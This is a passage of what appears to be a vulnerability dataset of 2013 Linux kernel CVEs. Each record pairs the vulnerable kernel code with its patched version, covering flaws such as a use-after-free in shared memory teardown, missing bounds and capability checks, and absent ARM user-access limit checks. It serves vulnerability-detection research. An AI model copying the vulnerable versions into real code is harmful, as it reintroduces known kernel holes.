 /* Linux only supports version 0 radiotap format */
 if (radiotap_header->it_version)
 return -EINVAL;
 */

 if ((unsigned long)iterator->_arg -
			    (unsigned long)iterator->_rtheader +
 sizeof(uint32_t) >
			    (unsigned long)iterator->_max_length)
 return -EINVAL;
		}
"
2013,DoS ,CVE-2013-7026," */
static void shm_destroy(struct ipc_namespace *ns, struct shmid_kernel *shp)
{




	ns->shm_tot -= (shp->shm_segsz + PAGE_SIZE - 1) >> PAGE_SHIFT;
 shm_rmid(ns, shp);
 shm_unlock(shp);
 if (!is_file_hugepages(shp->shm_file))
 shmem_lock(shp->shm_file, 0, shp->mlock_user);
 else if (shp->mlock_user)
 user_shm_unlock(file_inode(shp->shm_file)->i_size,
						shp->mlock_user);
 fput (shp->shm_file);
 ipc_rcu_putref(shp, shm_rcu_free);
}

		}

		shm_file = shp->shm_file;







 if (is_file_hugepages(shm_file))
 goto out_unlock0;

 goto out_unlock;

 ipc_lock_object(&shp->shm_perm);








	path = shp->shm_file->f_path;
 path_get(&path);
	shp->shm_nattch++;
"," */
static void shm_destroy(struct ipc_namespace *ns, struct shmid_kernel *shp)
{
 struct file *shm_file;

	shm_file = shp->shm_file;
	shp->shm_file = NULL;
	ns->shm_tot -= (shp->shm_segsz + PAGE_SIZE - 1) >> PAGE_SHIFT;
 shm_rmid(ns, shp);
 shm_unlock(shp);
 if (!is_file_hugepages(shm_file))
 shmem_lock(shm_file, 0, shp->mlock_user);
 else if (shp->mlock_user)
 user_shm_unlock(file_inode(shm_file)->i_size, shp->mlock_user);
 fput(shm_file);

 ipc_rcu_putref(shp, shm_rcu_free);
}

		}

		shm_file = shp->shm_file;

 /* check if shm_destroy() is tearing down shp */
 if (shm_file == NULL) {
			err = -EIDRM;
 goto out_unlock0;
		}

 if (is_file_hugepages(shm_file))
 goto out_unlock0;

 goto out_unlock;

 ipc_lock_object(&shp->shm_perm);

 /* check if shm_destroy() is tearing down shp */
 if (shp->shm_file == NULL) {
 ipc_unlock_object(&shp->shm_perm);
		err = -EIDRM;
 goto out_unlock;
	}

	path = shp->shm_file->f_path;
 path_get(&path);
	shp->shm_nattch++;
"
2013,DoS Overflow +Priv Mem. Corr. ,CVE-2013-6763,"{
 struct uio_device *idev = vma->vm_private_data;
 int mi = uio_find_mem_index(vma);

 if (mi < 0)
 return -EINVAL;


	vma->vm_ops = &uio_physical_vm_ops;



	vma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);










 return remap_pfn_range(vma,
			       vma->vm_start,
 idev->info->mem[mi].addr >> PAGE_SHIFT,
			       vma->vm_end - vma->vm_start,
			       vma->vm_page_prot);
}
int au1100fb_fb_mmap(struct fb_info *fbi, struct vm_area_struct *vma)
{
 struct au1100fb_device *fbdev;
 unsigned int len;
 unsigned long start=0, off;

	fbdev = to_au1100fb_device(fbi);

 if (vma->vm_pgoff > (~0UL >> PAGE_SHIFT)) {
 return -EINVAL;
	}

	start = fbdev->fb_phys & PAGE_MASK;
	len = PAGE_ALIGN((start & ~PAGE_MASK) + fbdev->fb_len);

	off = vma->vm_pgoff << PAGE_SHIFT;

 if ((vma->vm_end - vma->vm_start + off) > len) {
 return -EINVAL;
	}

	off += start;
	vma->vm_pgoff = off >> PAGE_SHIFT;

	vma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);
 pgprot_val(vma->vm_page_prot) |= (6 << 9); //CCA=6

 if (io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,
				vma->vm_end - vma->vm_start,
				vma->vm_page_prot)) {
 return -EAGAIN;
	}

 return 0;
}

static struct fb_ops au1100fb_ops =
 * method mainly to allow the use of the TLB streaming flag (CCA=6)
 */
static int au1200fb_fb_mmap(struct fb_info *info, struct vm_area_struct *vma)

{
 unsigned int len;
 unsigned long start=0, off;
 struct au1200fb_device *fbdev = info->par;

 if (vma->vm_pgoff > (~0UL >> PAGE_SHIFT)) {
 return -EINVAL;
	}

	start = fbdev->fb_phys & PAGE_MASK;
	len = PAGE_ALIGN((start & ~PAGE_MASK) + fbdev->fb_len);

	off = vma->vm_pgoff << PAGE_SHIFT;

 if ((vma->vm_end - vma->vm_start + off) > len) {
 return -EINVAL;
	}

	off += start;
	vma->vm_pgoff = off >> PAGE_SHIFT;

	vma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);
 pgprot_val(vma->vm_page_prot) |= _CACHE_MASK; /* CCA=7 */

 return io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,
				  vma->vm_end - vma->vm_start,
				  vma->vm_page_prot);
}

static void set_global(u_int cmd, struct au1200_lcd_global_regs_t *pdata)
","{
 struct uio_device *idev = vma->vm_private_data;
 int mi = uio_find_mem_index(vma);
 struct uio_mem *mem;
 if (mi < 0)
 return -EINVAL;
	mem = idev->info->mem + mi;

 if (vma->vm_end - vma->vm_start > mem->size)
 return -EINVAL;

	vma->vm_ops = &uio_physical_vm_ops;
	vma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);

 /*
	 * We cannot use the vm_iomap_memory() helper here,
	 * because vma->vm_pgoff is the map index we looked
	 * up above in uio_find_mem_index(), rather than an
	 * actual page offset into the mmap.
	 *
	 * So we just do the physical mmap without a page
	 * offset.
 */
 return remap_pfn_range(vma,
			       vma->vm_start,
 mem->addr >> PAGE_SHIFT,
			       vma->vm_end - vma->vm_start,
			       vma->vm_page_prot);
}
int au1100fb_fb_mmap(struct fb_info *fbi, struct vm_area_struct *vma)
{
 struct au1100fb_device *fbdev;



	fbdev = to_au1100fb_device(fbi);

















	vma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);
 pgprot_val(vma->vm_page_prot) |= (6 << 9); //CCA=6

 return vm_iomap_memory(vma, fbdev->fb_phys, fbdev->fb_len);






}

static struct fb_ops au1100fb_ops =
 * method mainly to allow the use of the TLB streaming flag (CCA=6)
 */
static int au1200fb_fb_mmap(struct fb_info *info, struct vm_area_struct *vma)

{


 struct au1200fb_device *fbdev = info->par;

















	vma->vm_page_prot = pgprot_noncached(vma->vm_page_prot);
 pgprot_val(vma->vm_page_prot) |= _CACHE_MASK; /* CCA=7 */

 return vm_iomap_memory(vma, fbdev->fb_phys, fbdev->fb_len);


}

static void set_global(u_int cmd, struct au1200_lcd_global_regs_t *pdata)
"
2013,DoS ,CVE-2013-6432," if (family == AF_INET) {
 struct sockaddr_in *sin = (struct sockaddr_in *)msg->msg_name;

 sin->sin_family = AF_INET;
 sin->sin_port = 0 /* skb->h.uh->source */;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));
		*addr_len = sizeof(*sin);



 if (isk->cmsg_flags)
 ip_cmsg_recv(msg, skb);
 struct sockaddr_in6 *sin6 =
			(struct sockaddr_in6 *)msg->msg_name;

		sin6->sin6_family = AF_INET6;
		sin6->sin6_port = 0;
		sin6->sin6_addr = ip6->saddr;
		sin6->sin6_flowinfo = 0;
 if (np->sndflow)
			sin6->sin6_flowinfo = ip6_flowinfo(ip6);

		sin6->sin6_scope_id = ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);
		*addr_len = sizeof(*sin6);



 if (inet6_sk(sk)->rxopt.all)
			pingv6_ops.ip6_datagram_recv_ctl(sk, msg, skb);
"," if (family == AF_INET) {
 struct sockaddr_in *sin = (struct sockaddr_in *)msg->msg_name;

 if (sin) {
 sin->sin_family = AF_INET;
 sin->sin_port = 0 /* skb->h.uh->source */;
 sin->sin_addr.s_addr = ip_hdr(skb)->saddr;
 memset(sin->sin_zero, 0, sizeof(sin->sin_zero));
			*addr_len = sizeof(*sin);
		}

 if (isk->cmsg_flags)
 ip_cmsg_recv(msg, skb);
 struct sockaddr_in6 *sin6 =
			(struct sockaddr_in6 *)msg->msg_name;

 if (sin6) {
			sin6->sin6_family = AF_INET6;
			sin6->sin6_port = 0;
			sin6->sin6_addr = ip6->saddr;
			sin6->sin6_flowinfo = 0;
 if (np->sndflow)
				sin6->sin6_flowinfo = ip6_flowinfo(ip6);
			sin6->sin6_scope_id =
 ipv6_iface_scope_id(&sin6->sin6_addr,
 IP6CB(skb)->iif);
			*addr_len = sizeof(*sin6);
		}

 if (inet6_sk(sk)->rxopt.all)
			pingv6_ops.ip6_datagram_recv_ctl(sk, msg, skb);
"
2013,DoS ,CVE-2013-6431,"	fn = fib6_add_1(root, &rt->rt6i_dst.addr, rt->rt6i_dst.plen,
 offsetof(struct rt6_info, rt6i_dst), allow_create,
			replace_required);

 if (IS_ERR(fn)) {
		err = PTR_ERR(fn);

 goto out;
	}

","	fn = fib6_add_1(root, &rt->rt6i_dst.addr, rt->rt6i_dst.plen,
 offsetof(struct rt6_info, rt6i_dst), allow_create,
			replace_required);

 if (IS_ERR(fn)) {
		err = PTR_ERR(fn);
		fn = NULL;
 goto out;
	}

"
2013,Bypass ,CVE-2013-6383,"static int aac_compat_ioctl(struct scsi_device *sdev, int cmd, void __user *arg)
{
 struct aac_dev *dev = (struct aac_dev *)sdev->host->hostdata;


 return aac_compat_do_ioctl(dev, cmd, (unsigned long)arg);
}

","static int aac_compat_ioctl(struct scsi_device *sdev, int cmd, void __user *arg)
{
 struct aac_dev *dev = (struct aac_dev *)sdev->host->hostdata;
 if (!capable(CAP_SYS_RAWIO))
 return -EPERM;
 return aac_compat_do_ioctl(dev, cmd, (unsigned long)arg);
}

"
2013,DoS Overflow Mem. Corr. ,CVE-2013-6382,,
2013,DoS Overflow ,CVE-2013-6381," struct qeth_cmd_buffer *iob;
 struct qeth_ipa_cmd *cmd;
 struct qeth_snmp_ureq *ureq;
 int req_len;
 struct qeth_arp_query_info qinfo = {0, };
 int rc = 0;

 /* skip 4 bytes (data_len struct member) to get req_len */
 if (copy_from_user(&req_len, udata + sizeof(int), sizeof(int)))
 return -EFAULT;




	ureq = memdup_user(udata, req_len + sizeof(struct qeth_snmp_ureq_hdr));
 if (IS_ERR(ureq)) {
 QETH_CARD_TEXT(card, 2, ""snmpnome"");
"," struct qeth_cmd_buffer *iob;
 struct qeth_ipa_cmd *cmd;
 struct qeth_snmp_ureq *ureq;
 unsigned int req_len;
 struct qeth_arp_query_info qinfo = {0, };
 int rc = 0;

 /* skip 4 bytes (data_len struct member) to get req_len */
 if (copy_from_user(&req_len, udata + sizeof(int), sizeof(int)))
 return -EFAULT;
 if (req_len > (QETH_BUFSIZE - IPA_PDU_HEADER_SIZE -
 sizeof(struct qeth_ipacmd_hdr) -
 sizeof(struct qeth_ipacmd_setadpparms_hdr)))
 return -EINVAL;
	ureq = memdup_user(udata, req_len + sizeof(struct qeth_snmp_ureq_hdr));
 if (IS_ERR(ureq)) {
 QETH_CARD_TEXT(card, 2, ""snmpnome"");
"
2013,DoS ,CVE-2013-6380," goto cleanup;
	}

 if (fibsize > (dev->max_fib_size - sizeof(struct aac_fibhdr))) {

		rcode = -EINVAL;
 goto cleanup;
	}
"," goto cleanup;
	}

 if ((fibsize < (sizeof(struct user_aac_srb) - sizeof(struct user_sgentry))) ||
	    (fibsize > (dev->max_fib_size - sizeof(struct aac_fibhdr)))) {
		rcode = -EINVAL;
 goto cleanup;
	}
"
2013,DoS ,CVE-2013-6378," char *p2;
 struct debug_data *d = f->private_data;

	pdata = kmalloc(cnt, GFP_KERNEL);



 if (pdata == NULL)
 return 0;

 kfree(pdata);
 return 0;
	}


	p0 = pdata;
 for (i = 0; i < num_of_items; i++) {
"," char *p2;
 struct debug_data *d = f->private_data;

 if (cnt == 0)
 return 0;

	pdata = kmalloc(cnt + 1, GFP_KERNEL);
 if (pdata == NULL)
 return 0;

 kfree(pdata);
 return 0;
	}
	pdata[cnt] = '\0';

	p0 = pdata;
 for (i = 0; i < num_of_items; i++) {
"
2013,DoS ,CVE-2013-6376," return (kvm_apic_get_reg(apic, APIC_ID) >> 24) & 0xff;
}



static void recalculate_apic_map(struct kvm *kvm)
{
 struct kvm_apic_map *new, *old = NULL;
 if (apic_x2apic_mode(apic)) {
			new->ldr_bits = 32;
			new->cid_shift = 16;
			new->cid_mask = new->lid_mask = 0xffff;

		} else if (kvm_apic_sw_enabled(apic) &&
				!new->cid_mask /* flat mode */ &&
 kvm_apic_get_reg(apic, APIC_DFR) == APIC_DFR_CLUSTER) {
"," return (kvm_apic_get_reg(apic, APIC_ID) >> 24) & 0xff;
}

#define KVM_X2APIC_CID_BITS 0

static void recalculate_apic_map(struct kvm *kvm)
{
 struct kvm_apic_map *new, *old = NULL;
 if (apic_x2apic_mode(apic)) {
			new->ldr_bits = 32;
			new->cid_shift = 16;
			new->cid_mask = (1 << KVM_X2APIC_CID_BITS) - 1;
			new->lid_mask = 0xffff;
		} else if (kvm_apic_sw_enabled(apic) &&
				!new->cid_mask /* flat mode */ &&
 kvm_apic_get_reg(apic, APIC_DFR) == APIC_DFR_CLUSTER) {
"
2013,DoS +Priv ,CVE-2013-6368,"void kvm_lapic_sync_from_vapic(struct kvm_vcpu *vcpu)
{
	u32 data;
 void *vapic;

 if (test_bit(KVM_APIC_PV_EOI_PENDING, &vcpu->arch.apic_attention))
 apic_sync_pv_eoi_from_guest(vcpu, vcpu->arch.apic);

 if (!test_bit(KVM_APIC_CHECK_VAPIC, &vcpu->arch.apic_attention))
 return;

	vapic = kmap_atomic(vcpu->arch.apic->vapic_page);
	data = *(u32 *)(vapic + offset_in_page(vcpu->arch.apic->vapic_addr));
 kunmap_atomic(vapic);

 apic_set_tpr(vcpu->arch.apic, data & 0xff);
}
	u32 data, tpr;
 int max_irr, max_isr;
 struct kvm_lapic *apic = vcpu->arch.apic;
 void *vapic;

 apic_sync_pv_eoi_to_guest(vcpu, apic);

		max_isr = 0;
	data = (tpr & 0xff) | ((max_isr & 0xf0) << 8) | (max_irr << 24);

	vapic = kmap_atomic(vcpu->arch.apic->vapic_page);
	*(u32 *)(vapic + offset_in_page(vcpu->arch.apic->vapic_addr)) = data;
 kunmap_atomic(vapic);
}

void kvm_lapic_set_vapic_addr(struct kvm_vcpu *vcpu, gpa_t vapic_addr)
{
	vcpu->arch.apic->vapic_addr = vapic_addr;
 if (vapic_addr)



 __set_bit(KVM_APIC_CHECK_VAPIC, &vcpu->arch.apic_attention);
 else
 __clear_bit(KVM_APIC_CHECK_VAPIC, &vcpu->arch.apic_attention);




}

int kvm_x2apic_msr_write(struct kvm_vcpu *vcpu, u32 msr, u64 data)
 */
 void *regs;
 gpa_t vapic_addr;
 struct page *vapic_page;
 unsigned long pending_events;
 unsigned int sipi_vector;
};
void kvm_apic_write_nodecode(struct kvm_vcpu *vcpu, u32 offset);
void kvm_apic_set_eoi_accelerated(struct kvm_vcpu *vcpu, int vector);

void kvm_lapic_set_vapic_addr(struct kvm_vcpu *vcpu, gpa_t vapic_addr);
void kvm_lapic_sync_from_vapic(struct kvm_vcpu *vcpu);
void kvm_lapic_sync_to_vapic(struct kvm_vcpu *vcpu);

		r = -EFAULT;
 if (copy_from_user(&va, argp, sizeof va))
 goto out;
		r = 0;
 kvm_lapic_set_vapic_addr(vcpu, va.vapic_addr);
 break;
	}
 case KVM_X86_SETUP_MCE: {
			!kvm_event_needs_reinjection(vcpu);
}

static int vapic_enter(struct kvm_vcpu *vcpu)
{
 struct kvm_lapic *apic = vcpu->arch.apic;
 struct page *page;

 if (!apic || !apic->vapic_addr)
 return 0;

	page = gfn_to_page(vcpu->kvm, apic->vapic_addr >> PAGE_SHIFT);
 if (is_error_page(page))
 return -EFAULT;

	vcpu->arch.apic->vapic_page = page;
 return 0;
}

static void vapic_exit(struct kvm_vcpu *vcpu)
{
 struct kvm_lapic *apic = vcpu->arch.apic;
 int idx;

 if (!apic || !apic->vapic_addr)
 return;

	idx = srcu_read_lock(&vcpu->kvm->srcu);
 kvm_release_page_dirty(apic->vapic_page);
 mark_page_dirty(vcpu->kvm, apic->vapic_addr >> PAGE_SHIFT);
 srcu_read_unlock(&vcpu->kvm->srcu, idx);
}

static void update_cr8_intercept(struct kvm_vcpu *vcpu)
{
 int max_irr, tpr;
 struct kvm *kvm = vcpu->kvm;

	vcpu->srcu_idx = srcu_read_lock(&kvm->srcu);
	r = vapic_enter(vcpu);
 if (r) {
 srcu_read_unlock(&kvm->srcu, vcpu->srcu_idx);
 return r;
	}

	r = 1;
 while (r > 0) {

 srcu_read_unlock(&kvm->srcu, vcpu->srcu_idx);

 vapic_exit(vcpu);

 return r;
}

","void kvm_lapic_sync_from_vapic(struct kvm_vcpu *vcpu)
{
	u32 data;


 if (test_bit(KVM_APIC_PV_EOI_PENDING, &vcpu->arch.apic_attention))
 apic_sync_pv_eoi_from_guest(vcpu, vcpu->arch.apic);

 if (!test_bit(KVM_APIC_CHECK_VAPIC, &vcpu->arch.apic_attention))
 return;

 kvm_read_guest_cached(vcpu->kvm, &vcpu->arch.apic->vapic_cache, &data,
 sizeof(u32));


 apic_set_tpr(vcpu->arch.apic, data & 0xff);
}
	u32 data, tpr;
 int max_irr, max_isr;
 struct kvm_lapic *apic = vcpu->arch.apic;


 apic_sync_pv_eoi_to_guest(vcpu, apic);

		max_isr = 0;
	data = (tpr & 0xff) | ((max_isr & 0xf0) << 8) | (max_irr << 24);

 kvm_write_guest_cached(vcpu->kvm, &vcpu->arch.apic->vapic_cache, &data,
 sizeof(u32));

}

int kvm_lapic_set_vapic_addr(struct kvm_vcpu *vcpu, gpa_t vapic_addr)
{
 if (vapic_addr) {
 if (kvm_gfn_to_hva_cache_init(vcpu->kvm,
					&vcpu->arch.apic->vapic_cache,
					vapic_addr, sizeof(u32)))
 return -EINVAL;
 __set_bit(KVM_APIC_CHECK_VAPIC, &vcpu->arch.apic_attention);
 } else {
 __clear_bit(KVM_APIC_CHECK_VAPIC, &vcpu->arch.apic_attention);
	}

	vcpu->arch.apic->vapic_addr = vapic_addr;
 return 0;
}

int kvm_x2apic_msr_write(struct kvm_vcpu *vcpu, u32 msr, u64 data)
 */
 void *regs;
 gpa_t vapic_addr;
 struct gfn_to_hva_cache vapic_cache;
 unsigned long pending_events;
 unsigned int sipi_vector;
};
void kvm_apic_write_nodecode(struct kvm_vcpu *vcpu, u32 offset);
void kvm_apic_set_eoi_accelerated(struct kvm_vcpu *vcpu, int vector);

int kvm_lapic_set_vapic_addr(struct kvm_vcpu *vcpu, gpa_t vapic_addr);
void kvm_lapic_sync_from_vapic(struct kvm_vcpu *vcpu);
void kvm_lapic_sync_to_vapic(struct kvm_vcpu *vcpu);

		r = -EFAULT;
 if (copy_from_user(&va, argp, sizeof va))
 goto out;
		r = kvm_lapic_set_vapic_addr(vcpu, va.vapic_addr);

 break;
	}
 case KVM_X86_SETUP_MCE: {
			!kvm_event_needs_reinjection(vcpu);
}































static void update_cr8_intercept(struct kvm_vcpu *vcpu)
{
 int max_irr, tpr;
 struct kvm *kvm = vcpu->kvm;

	vcpu->srcu_idx = srcu_read_lock(&kvm->srcu);






	r = 1;
 while (r > 0) {

 srcu_read_unlock(&kvm->srcu, vcpu->srcu_idx);



 return r;
}

"
2013,DoS ,CVE-2013-6367," ASSERT(apic != NULL);

 /* if initial count is 0, current count should also be 0 */
 if (kvm_apic_get_reg(apic, APIC_TMICT) == 0)

 return 0;

	remaining = hrtimer_get_remaining(&apic->lapic_timer.timer);
"," ASSERT(apic != NULL);

 /* if initial count is 0, current count should also be 0 */
 if (kvm_apic_get_reg(apic, APIC_TMICT) == 0 ||
		apic->lapic_timer.period == 0)
 return 0;

	remaining = hrtimer_get_remaining(&apic->lapic_timer.timer);
"
2013,,CVE-2013-6282,"	.size \name , . - \name
	.endm









#endif /* __ASM_ASSEMBLER_H__ */
extern int __get_user_2(void *);
extern int __get_user_4(void *);

#define __get_user_x(__r2,__p,__e,__s,__i...)				\








 __asm__ __volatile__ (					\
 __asmeq(""%0"", ""r0"") __asmeq(""%1"", ""r2"")			\

		""bl	__get_user_"" #__s				\
		: ""=&r"" (__e), ""=r"" (__r2)				\
		: ""0"" (__p) 					\
		: __i, ""cc"")

#define get_user(x,p)							\
	({								\

 register const typeof(*(p)) __user *__p asm(""r0"") = (p);\
 register unsigned long __r2 asm(""r2"");			\

 register int __e asm(""r0"");				\
 switch (sizeof(*(__p))) {				\
 case 1:							\
 __get_user_x(__r2, __p, __e, 1, ""lr"");		\
   break;						\
 case 2:							\
 __get_user_x(__r2, __p, __e, 2, ""r3"", ""lr"");	\
 break;						\
 case 4:							\
   __get_user_x(__r2, __p, __e, 4, ""lr"");		\
 break;						\
 default: __e = __get_user_bad(); break;			\
		}							\
extern int __put_user_4(void *, unsigned int);
extern int __put_user_8(void *, unsigned long long);

#define __put_user_x(__r2,__p,__e,__s) 				\
 __asm__ __volatile__ (					\
 __asmeq(""%0"", ""r0"") __asmeq(""%2"", ""r2"")			\

		""bl	__put_user_"" #__s				\
		: ""=&r"" (__e)						\
		: ""0"" (__p), ""r"" (__r2) 			\
		: ""ip"", ""lr"", ""cc"")

#define put_user(x,p)							\
	({								\

 register const typeof(*(p)) __r2 asm(""r2"") = (x);	\
 register const typeof(*(p)) __user *__p asm(""r0"") = (p);\

 register int __e asm(""r0"");				\
 switch (sizeof(*(__p))) {				\
 case 1:							\
 __put_user_x(__r2, __p, __e, 1);		\
 break;						\
 case 2:							\
 __put_user_x(__r2, __p, __e, 2);		\
 break;						\
 case 4:							\
 __put_user_x(__r2, __p, __e, 4);		\
 break;						\
 case 8:							\
 __put_user_x(__r2, __p, __e, 8);		\
 break;						\
 default: __e = __put_user_bad(); break;			\
		}							\
 * __get_user_X
 *
 * Inputs:	r0 contains the address

 * Outputs:	r0 is the error code
 *		r2, r3 contains the zero-extended value
 *		lr corrupted
 *
 * No other registers must be altered.  (see <asm/uaccess.h>
 * Note also that it is intended that __get_user_bad is not global.
 */
#include <linux/linkage.h>

#include <asm/errno.h>
#include <asm/domain.h>

ENTRY(__get_user_1)

1: TUSER(ldrb)	r2, [r0]
 mov	r0, #0
 mov	pc, lr
ENDPROC(__get_user_1)

ENTRY(__get_user_2)
#ifdef CONFIG_THUMB2_KERNEL
2: TUSER(ldrb)	r2, [r0]
3: TUSER(ldrb)	r3, [r0, #1]


#else
2: TUSER(ldrb)	r2, [r0], #1
3: TUSER(ldrb)	r3, [r0]

#endif
#ifndef __ARMEB__
	orr	r2, r2, r3, lsl #8
#else
	orr	r2, r3, r2, lsl #8
#endif
 mov	r0, #0
 mov	pc, lr
ENDPROC(__get_user_2)

ENTRY(__get_user_4)

4: TUSER(ldr)	r2, [r0]
 mov	r0, #0
 mov	pc, lr
 * __put_user_X
 *
 * Inputs:	r0 contains the address

 *		r2, r3 contains the value
 * Outputs:	r0 is the error code
 *		lr corrupted
 * Note also that it is intended that __put_user_bad is not global.
 */
#include <linux/linkage.h>

#include <asm/errno.h>
#include <asm/domain.h>

ENTRY(__put_user_1)

1: TUSER(strb)	r2, [r0]
 mov	r0, #0
 mov	pc, lr
ENDPROC(__put_user_1)

ENTRY(__put_user_2)

 mov	ip, r2, lsr #8
#ifdef CONFIG_THUMB2_KERNEL
#ifndef __ARMEB__
ENDPROC(__put_user_2)

ENTRY(__put_user_4)

4: TUSER(str)	r2, [r0]
 mov	r0, #0
 mov	pc, lr
ENDPROC(__put_user_4)

ENTRY(__put_user_8)

#ifdef CONFIG_THUMB2_KERNEL
5: TUSER(str)	r2, [r0]
6: TUSER(str)	r3, [r0, #4]
","	.size \name , . - \name
	.endm

	.macro check_uaccess, addr:req, size:req, limit:req, tmp:req, bad:req
#ifndef CONFIG_CPU_USE_DOMAINS
	adds	\tmp, \addr, #\size - 1
	sbcccs	\tmp, \tmp, \limit
	bcs	\bad
#endif
	.endm

#endif /* __ASM_ASSEMBLER_H__ */
extern int __get_user_2(void *);
extern int __get_user_4(void *);

#define __GUP_CLOBBER_1 ""lr"", ""cc""
#ifdef CONFIG_CPU_USE_DOMAINS
#define __GUP_CLOBBER_2 ""ip"", ""lr"", ""cc""
#else
#define __GUP_CLOBBER_2 ""lr"", ""cc""
#endif
#define __GUP_CLOBBER_4 ""lr"", ""cc""

#define __get_user_x(__r2,__p,__e,__l,__s)				\
 __asm__ __volatile__ (					\
 __asmeq(""%0"", ""r0"") __asmeq(""%1"", ""r2"")			\
		__asmeq(""%3"", ""r1"")					\
		""bl	__get_user_"" #__s				\
		: ""=&r"" (__e), ""=r"" (__r2)				\
		: ""0"" (__p), ""r"" (__l)					\
		: __GUP_CLOBBER_##__s)

#define get_user(x,p)							\
	({								\
 unsigned long __limit = current_thread_info()->addr_limit - 1; \
 register const typeof(*(p)) __user *__p asm(""r0"") = (p);\
 register unsigned long __r2 asm(""r2"");			\
 register unsigned long __l asm(""r1"") = __limit;		\
 register int __e asm(""r0"");				\
 switch (sizeof(*(__p))) {				\
 case 1:							\
 __get_user_x(__r2, __p, __e, __l, 1);		\
 break;						\
 case 2:							\
 __get_user_x(__r2, __p, __e, __l, 2);		\
 break;						\
 case 4:							\
 __get_user_x(__r2, __p, __e, __l, 4);		\
 break;						\
 default: __e = __get_user_bad(); break;			\
		}							\
extern int __put_user_4(void *, unsigned int);
extern int __put_user_8(void *, unsigned long long);

#define __put_user_x(__r2,__p,__e,__l,__s)				\
 __asm__ __volatile__ (					\
 __asmeq(""%0"", ""r0"") __asmeq(""%2"", ""r2"")			\
		__asmeq(""%3"", ""r1"")					\
		""bl	__put_user_"" #__s				\
		: ""=&r"" (__e)						\
		: ""0"" (__p), ""r"" (__r2), ""r"" (__l)			\
		: ""ip"", ""lr"", ""cc"")

#define put_user(x,p)							\
	({								\
 unsigned long __limit = current_thread_info()->addr_limit - 1; \
 register const typeof(*(p)) __r2 asm(""r2"") = (x);	\
 register const typeof(*(p)) __user *__p asm(""r0"") = (p);\
 register unsigned long __l asm(""r1"") = __limit;		\
 register int __e asm(""r0"");				\
 switch (sizeof(*(__p))) {				\
 case 1:							\
 __put_user_x(__r2, __p, __e, __l, 1);		\
 break;						\
 case 2:							\
 __put_user_x(__r2, __p, __e, __l, 2);		\
 break;						\
 case 4:							\
 __put_user_x(__r2, __p, __e, __l, 4);		\
 break;						\
 case 8:							\
 __put_user_x(__r2, __p, __e, __l, 8);		\
 break;						\
 default: __e = __put_user_bad(); break;			\
		}							\
 * __get_user_X
 *
 * Inputs:	r0 contains the address
 *		r1 contains the address limit, which must be preserved
 * Outputs:	r0 is the error code
 *		r2 contains the zero-extended value
 *		lr corrupted
 *
 * No other registers must be altered.  (see <asm/uaccess.h>
 * Note also that it is intended that __get_user_bad is not global.
 */
#include <linux/linkage.h>
#include <asm/assembler.h>
#include <asm/errno.h>
#include <asm/domain.h>

ENTRY(__get_user_1)
	check_uaccess r0, 1, r1, r2, __get_user_bad
1: TUSER(ldrb)	r2, [r0]
 mov	r0, #0
 mov	pc, lr
ENDPROC(__get_user_1)

ENTRY(__get_user_2)
	check_uaccess r0, 2, r1, r2, __get_user_bad
#ifdef CONFIG_CPU_USE_DOMAINS
rb	.req	ip
2:	ldrbt	r2, [r0], #1
3:	ldrbt	rb, [r0], #0
#else
rb	.req	r0
2:	ldrb	r2, [r0]
3:	ldrb	rb, [r0, #1]
#endif
#ifndef __ARMEB__
	orr	r2, r2, rb, lsl #8
#else
	orr	r2, rb, r2, lsl #8
#endif
 mov	r0, #0
 mov	pc, lr
ENDPROC(__get_user_2)

ENTRY(__get_user_4)
	check_uaccess r0, 4, r1, r2, __get_user_bad
4: TUSER(ldr)	r2, [r0]
 mov	r0, #0
 mov	pc, lr
 * __put_user_X
 *
 * Inputs:	r0 contains the address
 *		r1 contains the address limit, which must be preserved
 *		r2, r3 contains the value
 * Outputs:	r0 is the error code
 *		lr corrupted
 * Note also that it is intended that __put_user_bad is not global.
 */
#include <linux/linkage.h>
#include <asm/assembler.h>
#include <asm/errno.h>
#include <asm/domain.h>

ENTRY(__put_user_1)
	check_uaccess r0, 1, r1, ip, __put_user_bad
1: TUSER(strb)	r2, [r0]
 mov	r0, #0
 mov	pc, lr
ENDPROC(__put_user_1)

ENTRY(__put_user_2)
	check_uaccess r0, 2, r1, ip, __put_user_bad
 mov	ip, r2, lsr #8
#ifdef CONFIG_THUMB2_KERNEL
#ifndef __ARMEB__
ENDPROC(__put_user_2)

ENTRY(__put_user_4)
	check_uaccess r0, 4, r1, ip, __put_user_bad
4: TUSER(str)	r2, [r0]
 mov	r0, #0
 mov	pc, lr
ENDPROC(__put_user_4)

ENTRY(__put_user_8)
	check_uaccess r0, 8, r1, ip, __put_user_bad
#ifdef CONFIG_THUMB2_KERNEL
5: TUSER(str)	r2, [r0]
6: TUSER(str)	r3, [r0, #4]
"
2013,DoS ,CVE-2013-5634," wait_event_interruptible(*wq, !vcpu->arch.pause);
}






/**
 * kvm_arch_vcpu_ioctl_run - the main VCPU run function to execute guest code
 * @vcpu:	The VCPU pointer
 int ret;
 sigset_t sigsaved;

 /* Make sure they initialize the vcpu with KVM_ARM_VCPU_INIT */
 if (unlikely(vcpu->arch.target < 0))
 return -ENOEXEC;

	ret = kvm_vcpu_first_run_init(vcpu);
 case KVM_SET_ONE_REG:
 case KVM_GET_ONE_REG: {
 struct kvm_one_reg reg;




 if (copy_from_user(&reg, argp, sizeof(reg)))
 return -EFAULT;
 if (ioctl == KVM_SET_ONE_REG)
 struct kvm_reg_list reg_list;
 unsigned n;




 if (copy_from_user(&reg_list, user_list, sizeof(reg_list)))
 return -EFAULT;
		n = reg_list.n;
"," wait_event_interruptible(*wq, !vcpu->arch.pause);
}

static int kvm_vcpu_initialized(struct kvm_vcpu *vcpu)
{
 return vcpu->arch.target >= 0;
}

/**
 * kvm_arch_vcpu_ioctl_run - the main VCPU run function to execute guest code
 * @vcpu:	The VCPU pointer
 int ret;
 sigset_t sigsaved;

 if (unlikely(!kvm_vcpu_initialized(vcpu)))

 return -ENOEXEC;

	ret = kvm_vcpu_first_run_init(vcpu);
